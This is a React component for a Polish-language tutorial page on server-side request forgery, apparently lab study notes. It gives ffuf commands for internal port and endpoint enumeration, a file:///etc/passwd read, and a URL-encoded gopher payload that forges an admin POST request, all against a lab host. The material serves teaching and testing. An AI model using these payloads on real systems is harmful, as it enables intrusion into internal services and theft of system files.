import { Link } from 'react-router-dom';
import ExampleFrame from '../../exampleFrame/ExampleFrame';
import ssrf_identyfi from '../.././../assets/ssrf_identyfi.png';
import ssrf_identyfi_1 from '../.././../assets/ssrf_identyfi_1.png';
import ssrf_identyfi_2 from '../.././../assets/ssrf_identyfi_2.png';
import ssrf_identyfi_3 from '../.././../assets/ssrf_identyfi_3.png';
import ssrf_enumeration from '../.././../assets/ssrf_enumeration.png';
import ssrf_lfi from '../.././../assets/ssrf_lfi.png';
import ssrf_404 from '../.././../assets/ssrf_404.png';

const SSRF = () => {

    return(
        <section>
            <h1>SSRF (Server-Side Request Forgery)</h1>

            <p>Fałszowanie żądań po stronie serwera (SSRF) to luka w zabezpieczeniach, w przypadku której osoba atakująca może zmanipulować aplikację internetową w celu wysłania nieautoryzowanych żądań z serwera. Luka ta często występuje, gdy aplikacja wysyła żądania HTTP do innych serwerów na podstawie danych wprowadzonych przez użytkownika. Pomyślne wykorzystanie SSRF może umożliwić atakującemu uzyskanie dostępu do systemów wewnętrznych, ominięcie zapór sieciowych i odzyskanie poufnych informacji.</p>

            <hr />

            <h3>Identyfikacja SSRF</h3>

            <ExampleFrame screen={ssrf_identyfi} />
            <p>Zmieniamy url na nasze nasłuchujące IP</p>
            <ExampleFrame screen={ssrf_identyfi_1} />
            <p>Ponieważ odpowiedź zawiera kod HTML aplikacji internetowej, podatność SSRF nie jest ślepa, tzn. odpowiedź jest nam wyświetlana.</p>
            <ExampleFrame screen={ssrf_identyfi_2} />
            <p>W odbiorniku netcat możemy odebrać połączenie, potwierdzając tym samym SSRF</p>
            <p>Aby ustalić, czy odpowiedź HTTP odzwierciedla otrzymaną od nas odpowiedź SSRF, wskażmy aplikację internetową samej sobie, podając adres URL http://127.0.0.1/index.php:</p>
            <ExampleFrame screen={ssrf_identyfi_3} />
            <p>Ponieważ odpowiedź zawiera kod HTML aplikacji internetowej, podatność SSRF nie jest ślepa, tzn. odpowiedź jest nam wyświetlana.</p>
        
            <hr />

            <h2>Enumeracja systemu/ usług</h2>
            <div className='waring'>
                <p>ffuf -w ./ports.txt -u http://172.17.0.2/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "dateserver=http://127.0.0.1:FUZZ/&date=2024-01-01" -fr "Failed to connect to"</p>
            </div>
            <ExampleFrame screen={ssrf_enumeration} />
            <p>W rezultacie otrzymujemy otwarty port 3306 (SQL)</p>

            <hr />

            <h2>Dostęp do ograniczonych punktów końcowych</h2>
            <p>Wymuszamy błędną stronę 404</p>
            <ExampleFrame screen={ssrf_404} />
            <p>Jak widzimy, serwer WWW odpowiada domyślną odpowiedzią Apache 404. Aby również odfiltrować wszelkie odpowiedzi HTTP 403, przefiltrujemy nasze wyniki w oparciu o ciąg znaków <span className='important'>Server at dateserver.htb Port 80</span>, który jest zawarty na domyślnych stronach błędów Apache. Ponieważ aplikacja internetowa działa w języku PHP, określimy rozszerzenie .php:</p>
            <div className='waring'>
                <p>ffuf -w raft-small-words.txt -u http://172.17.0.2/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "dateserver=http://dateserver.htb/FUZZ.php&date=2024-01-01" -fr "Server at dateserver.htb Port 80"</p>
            </div>

            <hr />

            <h2>Dołączanie plików lokalnych (LFI)</h2>
            <p>Ponieważ schemat adresu URL jest częścią adresu URL dostarczanego do aplikacji internetowej, spróbujmy odczytać pliki lokalne z systemu plików przy użyciu schematu adresu URL <span className='important'>file://</span>. Możemy to osiągnąć podając adres URL <span className='important'>file:///etc/passwd</span></p>
            <ExampleFrame screen={ssrf_lfi} />

            <hr />

            <h2>Tworzenie Gopher</h2>
            <p>Schematu adresu URL gopher służy do wysłania dowolnych bajtów do gniazda TCP. Protokół ten umożliwia nam utworzenie żądania POST poprzez samodzielne zbudowanie żądania HTTP.</p>
            <p>Musimy zakodować w adresie URL wszystkie znaki specjalne, aby skonstruować z tego prawidłowy adres URL gophera. W szczególności spacje (<span className='important'>%20</span>) i znaki nowej linii (<span className='important'>%0D%0A</span>) muszą być zakodowane w adresie URL. Następnie musimy poprzedzić dane schematem adresu URL gophera, docelowym hostem i portem oraz podkreśleniem, w wyniku czego otrzymamy następujący adres URL gophera</p>
            
            <div className='waring'>
                <p>POST /admin.php HTTP/1.1</p>
                <p>Host: dateserver.htb</p>
                <p>Content-Length: 265</p>
                <p>Content-Type: application/x-www-form-urlencoded</p>
                <p>adminpw=admin</p>
            </div>

            <p className='important'>dateserver=gopher%3a//dateserver.htb%3a80/_POST%2520/admin.php%2520HTTP%252F1.1%250D%250AHost%3a%2520dateserver.htb%250D%250AContent-Length%3a%252013%250D%250AContent-Type%3a%2520application/x-www-form-urlencoded%250D%250A%250D%250Aadminpw%253Dadmin&date=2024-01-01</p>
            <div className='waring'>
                <p>UWAGA: Zakodować jeszcze trzeba w URL</p>
            </div>

            <div className='waring'>
                <p>POST /admin.php HTTP/1.1</p>
                <p>Host: dateserver.htb</p>
                <p>Content-Length: 265</p>
                <p>Content-Type: application/x-www-form-urlencoded</p>
                <p>dateserver=gopher%3a//dateserver.htb%3a80/_POST%2520/admin.php%2520HTTP%252F1.1%250D%250AHost%3a%2520dateserver.htb%250D%250AContent-Length%3a%252013%250D%250AContent-Type%3a%2520application/x-www-form-urlencoded%250D%250A%250D%250Aadminpw%253Dadmin&date=2024-01-01</p>
            </div>
            

        </section>
    )
};

export default SSRF;